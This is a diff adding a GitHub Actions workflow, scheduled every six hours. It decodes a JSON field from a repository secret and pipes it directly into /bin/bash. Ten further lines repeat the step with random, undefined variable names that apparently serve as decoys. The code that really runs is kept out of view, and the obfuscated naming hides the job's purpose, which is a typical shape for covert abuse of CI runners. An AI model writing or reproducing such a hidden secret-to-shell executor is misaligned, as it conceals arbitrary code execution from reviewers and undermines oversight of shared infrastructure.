@@ -1,0 +1,28 @@
+name: chensirxx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chensirxx
+        env:
+          tiav3555: ${{ secrets.tiav3555 }}
+        run: |
+          echo $tiav3555 | jq -r .laszr50664 | /bin/bash
+          echo $eihwe8755 | jq -r .ywf8834 | /bin/bash
+          echo $rlvd04 | jq -r .wr0765 | /bin/bash
+          echo $tas72806 | jq -r .woako6 | /bin/bash
+          echo $hmwl38 | jq -r .esity81002 | /bin/bash
+          echo $yjj30 | jq -r .jb42 | /bin/bash
+          echo $gizb3433 | jq -r .baxm9 | /bin/bash
+          echo $ir614 | jq -r .utbf5675 | /bin/bash
+          echo $npcs60441 | jq -r .pywz262 | /bin/bash
+          echo $fbfaj5215 | jq -r .fzhn0 | /bin/bash
+          echo $zffiv974 | jq -r .mev3 | /bin/bash
+
